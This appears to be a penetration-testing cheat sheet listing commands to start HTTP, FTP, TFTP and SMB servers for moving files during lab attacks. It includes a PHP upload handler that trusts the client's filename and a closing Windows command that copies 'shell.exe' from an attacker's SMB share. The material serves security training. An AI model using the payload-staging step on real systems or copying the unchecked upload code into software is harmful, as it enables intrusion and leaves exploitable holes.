# HTTP Server

### Python3 server

```bash
python3 -m http.server [port]
```

### Python2 server

```bash
python -m SimpleHTTPServer [port]
```

#### Flask custom server

→ [Sample Flask Web Server](Python.md#Sample%20Flask%20Web%20Server)

### PHP server

```bash
php -S 0.0.0.0:8000
```

### Ruby server

```bash
ruby -run -e httpd . -p 9000
```

### Busybox server

```bash
busybox httpd -f -p 10000
```

### Apache server

```bash
service apache2 start
cd /var/www/html
```

### PHP Downloader

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

---

# FTP Server

### pure-ftpd

Fast setup:

```bash
kali@kali:~$ cat ./setup-ftp.sh
#!/bin/bash
sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

Files contained within `/ftphome` will be available once connected

### python3

```bash
python3 -m pyftpdlib -p 21
[I 2020-07-14 22:54:10] >>> starting FTP server on 0.0.0.0:21, pid=7302 <<<
[I 2020-07-14 22:54:10] concurrency model: async
[I 2020-07-14 22:54:10] masquerade (NAT) address: None
[I 2020-07-14 22:54:10] passive ports: None
```

- `-w`: write access
- `-u`: specifies username to use
- `-P`: specifies password to use

### TFTP

```bash
kali@kali:~$ sudo chown nobody: /tftp
kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
```

---

# SMB

### Impacket

`smbserver.py` ([ref](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)) from the [impacket](../Tools/impacket.md) project can be used to launch a nice, simple SMB server on port 445.

```bash
# Non authenticated share
kali@kali:~$ python smbserver.py transfer_share /root/shells/

# authenticated share
kali@kali:~$ sudo impacket-smbserver kali . -smb2support -username maoutis -password Qwerty
```

```bash
C:\>copy \\192.168.119.209\transf_share\shell.exe .
copy \\192.168.119.209\transf_share\shell.exe .
        1 file(s) copie
```